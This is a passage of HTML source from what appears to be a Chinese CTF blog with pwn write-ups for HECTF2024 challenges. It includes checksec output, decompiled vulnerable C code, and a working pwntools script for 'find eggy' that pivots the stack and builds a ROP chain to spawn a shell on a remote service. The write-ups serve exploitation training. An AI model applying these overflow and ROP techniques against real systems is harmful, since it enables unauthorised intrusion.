in</h3>\n<p>​\t\t检查无保护：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">g01den@MSI:/mnt/c/Users/20820/Downloads/attachment$ checksec pwn</span><br><span class=\"line\">[*] &#x27;/mnt/c/Users/20820/Downloads/attachment/pwn&#x27;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">10</span>]; <span class=\"comment\">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">10</span>]; <span class=\"comment\">// [rsp+12h] [rbp-Eh] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v6; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  init(argc, argv, envp);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;please sign in!!!!&quot;</span>);</span><br><span class=\"line\">  gets(s);</span><br><span class=\"line\">  v6 = <span class=\"built_in\">strlen</span>(s);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v6 &gt; <span class=\"number\">8</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;overflow&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Enter your key&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0xA</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strncmp</span>(buf, m, <span class=\"number\">0xA</span>uLL) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;login--------&quot;</span>);</span><br><span class=\"line\">    close(<span class=\"number\">1</span>);</span><br><span class=\"line\">    backd00r();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t两个办法：</p>\n<p><strong>方法一：</strong></p>\n<p>​\t\tgets 没有能造成栈溢出，用 \\x00 可以绕过 strlen 的比较，可以直接溢出劫持 rip 到 backd00r，这里就不给 exp 了。</p>\n<p><strong>方法二：</strong></p>\n<p>​\t\t寻常绕 close (1)，key 为 HECTF!，之后 sh flag 报错带出来即可。</p>\n<h3 id=\"find-eggy\"><a class=\"markdownIt-Anchor\" href=\"#find-eggy\">#</a> find eggy：</h3>\n<p>​\t\t寻常栈迁移，漏洞在 check 函数里：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">check</span><span class=\"params\">(__int16 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v1; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">28</span>]; <span class=\"comment\">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+2Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(aKaka);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(&amp;byte_4020A8);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;-------       --------\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;||||||||       |||||||| \\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;                         \\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;           V              \\n&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Success!&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Don&#x27;t touch me!&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( read(<span class=\"number\">0</span>, &amp;s, <span class=\"number\">0x70</span>uLL) &lt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      perror(<span class=\"string\">&quot;read error&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;TvT&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x30</span>uLL) &lt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      perror(<span class=\"string\">&quot;read error&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v1 = atoi(buf);</span><br><span class=\"line\">    v4 = calculate_sum_of_factors(v1);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The sum of factors of %s is %d\\n&quot;</span>, buf, v4);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(buf, <span class=\"string\">&quot;12345&quot;</span>) &amp;&amp; v4 == <span class=\"number\">15616</span> )</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Congratulations! You found the flag&#123;this is flag&#125;&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;yes!&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t两次读取，第一次读到 bss 段上，第二次在栈上，但是第二次限制了读取大小，不足以构造 ROP 链，所以栈迁移到 bss 段上：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;0.0.0.0&#x27;</span>,<span class=\"number\">9393</span>)</span><br><span class=\"line\">s = <span class=\"number\">0x405600</span></span><br><span class=\"line\">system = <span class=\"number\">0x4015ad</span></span><br><span class=\"line\">binsh = <span class=\"number\">0x403680</span></span><br><span class=\"line\">rdi = <span class=\"number\">0x401326</span></span><br><span class=\"line\">leave = <span class=\"number\">0x4014c0</span></span><br><span class=\"line\">ret = <span class=\"number\">0x40101a</span></span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;-983040&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&quot;Don&#x27;t touch me!&quot;</span>)</span><br><span class=\"line\">pay = p64(rdi) +p64(binsh) +p64(ret) +p64(system)</span><br><span class=\"line\">p.sendline(pay)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&#x27;TvT&#x27;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span> +p64(s-<span class=\"number\">8</span>)+p64(leave)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"arcaea_sorting\"><a class=\"markdownIt-Anchor\" href=\"#arcaea_sorting\">#</a> Arcaea_Sorting：</h3>\n<p>​\t\t第一次出题，踩坑太多了，这次差点儿给自己弄废了，不过好歹是出出来了，坑啊，全是坑。</p>\n<p>​\t\t首先是 checksec 一下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">g01den@MSI:~/CTest/HECTF2024/pwn3$ checksec pwn</span><br><span class=\"line\">[*] &#x27;/home/g01den/CTest/HECTF2024/pwn3/pwn&#x27;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n<p>​\t\t别问为啥是 32 位的，因为 32 位在 strspy 那里过不了，得用其他操作，不是我想考的点，所以这里就只有考 32 位了。</p>\n<p>​\t\t玩儿过 Arcaea 的应该都知道，这个程序大概有啥用，别的不说，先跑一下看看：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Welcome to the Arcaea Query developed by g01den, which is currently in the development stage</span><br><span class=\"line\">    ___</span><br><span class=\"line\">   /   |  ______________ ____  ____ _</span><br><span class=\"line\">  / /| | / ___/ ___/ __ `/ _ \\/ __ `/</span><br><span class=\"line\"> / ___ |/ /  / /__/ /_/ /  __/ /_/ /</span><br><span class=\"line\">/_/  |_/_/   \\___/\\__,_/\\___/\\__,_/</span><br><span class=\"line\">If you find any questions, please do not contact g01den for resolution</span><br><span class=\"line\">I would like to know your complete PTT (Potential Value), would it be convenient for you to tell me?</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里首先是让我们输入自己的定数，之后做啥处理没静态不清楚，随便输入一个 12 看看：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10</span><br><span class=\"line\">Come on, the flowers are purple and about to turn red. You will step onto the ladder of the big shots</span><br><span class=\"line\">=======Please select the following options to use the relevant functions========</span><br><span class=\"line\">1. If the score is qualified, it will be stored in B30</span><br><span class=\"line\">2. Calculate single PTT</span><br><span class=\"line\">3. Calculate player PTT through b30</span><br><span class=\"line\">4. Give your favorite song a vote</span><br><span class=\"line\">5. View voted songs</span><br><span class=\"line\">6. Output all content of b30</span><br><span class=\"line\">7. Exit the system</span><br></pre></td></tr></table></figure>\n<p>​\t\t大概有啥用应该从字面上应该能懂：</p>\n<ol>\n<li>功能键 1 是算歌曲分数和单曲 ptt 然后加入 b30，具体逻辑是否正确我不是很清楚，但测试的时候没啥太大的问题。</li>\n<li>功能键 2 是计算单曲 ptt 并输出</li>\n<li>功能键 3 是从 b30 里计算出玩家 ptt，不计算 r10，所以只能做参考</li>\n<li>功能键 5 是给最喜欢的谱子投票</li>\n<li>功能键 5 是输出投的票的歌曲名字</li>\n<li>功能键 5 是输出所有 b30 的内容</li>\n<li>功能键 7 是推出这个系统</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">=======Please select the following options to use the relevant functions========</span><br><span class=\"line\">1. If the score is qualified, it will be stored in B30</span><br><span class=\"line\">2. Calculate single PTT</span><br><span class=\"line\">3. Calculate player PTT through b30</span><br><span class=\"line\">4. Give your favorite song a vote</span><br><span class=\"line\">5. View voted songs</span><br><span class=\"line\">6. Output all content of b30</span><br><span class=\"line\">7. Exit the system</span><br><span class=\"line\">1</span><br><span class=\"line\">Please enter the exact number of songs you want to query:11.5</span><br><span class=\"line\"></span><br><span class=\"line\">Please enter your score for this spectrum:10000000</span><br><span class=\"line\"></span><br><span class=\"line\">The single PTT is 13.500000, you still need to keep working hard. Even if you PM, it&#x27;s the same. You can&#x27;t be proud anymore</span><br><span class=\"line\">=======Please select the following options to use the relevant functions========</span><br><span class=\"line\">1. If the score is qualified, it will be stored in B30</span><br><span class=\"line\">2. Calculate single PTT</span><br><span class=\"line\">3. Calculate player PTT through b30</span><br><span class=\"line\">4. Give your favorite song a vote</span><br><span class=\"line\">5. View voted songs</span><br><span class=\"line\">6. Output all content of b30</span><br><span class=\"line\">7. Exit the system</span><br><span class=\"line\">6</span><br><span class=\"line\">rating = 13.500000,music = 11.500000</span><br><span class=\"line\">=======Please select the following options to use the relevant functions========</span><br><span class=\"line\">1. If the score is qualified, it will be stored in B30</span><br><span class=\"line\">2. Calculate single PTT</span><br><span class=\"line\">3. Calculate player PTT through b30</span><br><span class=\"line\">4. Give your favorite song a vote</span><br><span class=\"line\">5. View voted songs</span><br><span class=\"line\">6. Output all content of b30</span><br><span class=\"line\">7. Exit the system</span><br><span class=\"line\">3</span><br><span class=\"line\">Your PTT is13.500000</span><br><span class=\"line\">=======Please select the following options to use the relevant functions========</span><br><span class=\"line\">1. If the score is qualified, it will be stored in B30</span><br><span class=\"line\">2. Calculate single PTT</span><br><span class=\"line\">3. Calculate player PTT through b30</span><br><span class=\"line\">4. Give your favorite song a vote</span><br><span class=\"line\">5. View voted songs</span><br><span class=\"line\">6. Output all content of b30</span><br><span class=\"line\">7. Exit the system</span><br><span class=\"line\">3</span><br><span class=\"line\">Your PTT is13.500000</span><br><span class=\"line\">=======Please select the following options to use the relevant functions========</span><br><span class=\"line\">1. If the score is qualified, it will be stored in B30</span><br><span class=\"line\">2. Calculate single PTT</span><br><span class=\"line\">3. Calculate player PTT through b30</span><br><span class=\"line\">4. Give your favorite song a vote</span><br><span class=\"line\">5. View voted songs</span><br><span class=\"line\">6. Output all content of b30</span><br><span class=\"line\">7. Exit the system</span><br><span class=\"line\">1</span><br><span class=\"line\">Please enter the exact number of songs you want to query:11.3</span><br><span class=\"line\"></span><br><span class=\"line\">Please enter your score for this spectrum:10000000</span><br><span class=\"line\"></span><br><span class=\"line\">The single PTT is 13.300000, you still need to keep working hard. Even if you PM, it&#x27;s the same. You can&#x27;t be proud anymore</span><br><span class=\"line\">=======Please select the following options to use the relevant functions========</span><br><span class=\"line\">1. If the score is qualified, it will be stored in B30</span><br><span class=\"line\">2. Calculate single PTT</span><br><span class=\"line\">3. Calculate player PTT through b30</span><br><span class=\"line\">4. Give your favorite song a vote</span><br><span class=\"line\">5. View voted songs</span><br><span class=\"line\">6. Output all content of b30</span><br><span class=\"line\">7. Exit the system</span><br><span class=\"line\">1</span><br><span class=\"line\">Please enter the exact number of songs you want to query:11.2</span><br><span class=\"line\"></span><br><span class=\"line\">Please enter your score for this spectrum:10000000</span><br><span class=\"line\"></span><br><span class=\"line\">The single PTT is 13.200000, you still need to keep working hard. Even if you PM, it&#x27;s the same. You can&#x27;t be proud anymore</span><br><span class=\"line\">=======Please select the following options to use the relevant functions========</span><br><span class=\"line\">1. If the score is qualified, it will be stored in B30</span><br><span class=\"line\">2. Calculate single PTT</span><br><span class=\"line\">3. Calculate player PTT through b30</span><br><span class=\"line\">4. Give your favorite song a vote</span><br><span class=\"line\">5. View voted songs</span><br><span class=\"line\">6. Output all content of b30</span><br><span class=\"line\">7. Exit the system</span><br><span class=\"line\">3</span><br><span class=\"line\">Your PTT is13.333333</span><br><span class=\"line\">=======Please select the following options to use the relevant functions========</span><br><span class=\"line\">1. If the score is qualified, it will be stored in B30</span><br><span class=\"line\">2. Calculate single PTT</span><br><span class=\"line\">3. Calculate player PTT through b30</span><br><span class=\"line\">4. Give your favorite song a vote</span><br><span class=\"line\">5. View voted songs</span><br><span class=\"line\">6. Output all content of b30</span><br><span class=\"line\">7. Exit the system</span><br><span class=\"line\">3</span><br><span class=\"line\">Your PTT is13.333333</span><br><span class=\"line\">=======Please select the following options to use the relevant functions========</span><br><span class=\"line\">1. If the score is qualified, it will be stored in B30</span><br><span class=\"line\">2. Calculate single PTT</span><br><span class=\"line\">3. Calculate player PTT through b30</span><br><span class=\"line\">4. Give your favorite song a vote</span><br><span class=\"line\">5. View voted songs</span><br><span class=\"line\">6. Output all content of b30</span><br><span class=\"line\">7. Exit the system</span><br><span class=\"line\">3</span><br><span class=\"line\">Your PTT is13.333333</span><br><span class=\"line\">=======Please select the following options to use the relevant functions========</span><br><span class=\"line\">1. If the score is qualified, it will be stored in B30</span><br><span class=\"line\">2. Calculate single PTT</span><br><span class=\"line\">3. Calculate player PTT through b30</span><br><span class=\"line\">4. Give your favorite song a vote</span><br><span class=\"line\">5. View voted songs</span><br><span class=\"line\">6. Output all content of b30</span><br><span class=\"line\">7. Exit the system</span><br><span class=\"line\">6</span><br><span class=\"line\">rating = 13.200000,music = 11.200000</span><br><span class=\"line\">rating = 13.300000,music = 11.300000</span><br><span class=\"line\">rating = 13.500000,music = 11.500000</span><br></pre></td></tr></table></figure>\n<p>​\t\t似乎没啥问题。再看看 4、5 两个功能：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">=======Please select the following options to use the relevant functions========</span><br><span class=\"line\">1. If the score is qualified, it will be stored in B30</span><br><span class=\"line\">2. Calculate single PTT</span><br><span class=\"line\">3. Calculate player PTT through b30</span><br><span class=\"line\">4. Give your favorite song a vote</span><br><span class=\"line\">5. View voted songs</span><br><span class=\"line\">6. Output all content of b30</span><br><span class=\"line\">7. Exit the system</span><br><span class=\"line\">4</span><br><span class=\"line\">You can vote for what you like. You can input the name of your favorite song and cast your valuable vote</span><br><span class=\"line\">You can  vote 3 times, you can vote other songs, and you can&#x27;t vote for the same song again. There won&#x27;t be any problems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)testify</span><br><span class=\"line\">Your vote was for testify</span><br><span class=\"line\">. Thank you for your affirmation of this spectrum, and I hope you can score smoothly</span><br><span class=\"line\">=======Please select the following options to use the relevant functions========</span><br><span class=\"line\">1. If the score is qualified, it will be stored in B30</span><br><span class=\"line\">2. Calculate single PTT</span><br><span class=\"line\">3. Calculate player PTT through b30</span><br><span class=\"line\">4. Give your favorite song a vote</span><br><span class=\"line\">5. View voted songs</span><br><span class=\"line\">6. Output all content of b30</span><br><span class=\"line\">7. Exit the system</span><br><span class=\"line\">5</span><br><span class=\"line\">The name of the song you voted for is:</span><br><span class=\"line\">testify</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里，总的能输入字符的感觉只有 4，其他的只有数字。</p>\n<p>​\t\t上 IDA：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">long</span> <span class=\"type\">double</span> v3; <span class=\"comment\">// fst7</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v5; <span class=\"comment\">// [esp-Ah] [ebp-20h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v6; <span class=\"comment\">// [esp-6h] [ebp-1Ch]</span></span><br><span class=\"line\">  __int16 v7; <span class=\"comment\">// [esp+0h] [ebp-16h] BYREF</span></span><br><span class=\"line\">  __int16 *v8; <span class=\"comment\">// [esp+2h] [ebp-14h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v9; <span class=\"comment\">// [esp+6h] [ebp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v10; <span class=\"comment\">// [esp+Ah] [ebp-Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> *p_argc; <span class=\"comment\">// [esp+Eh] [ebp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  p_argc = 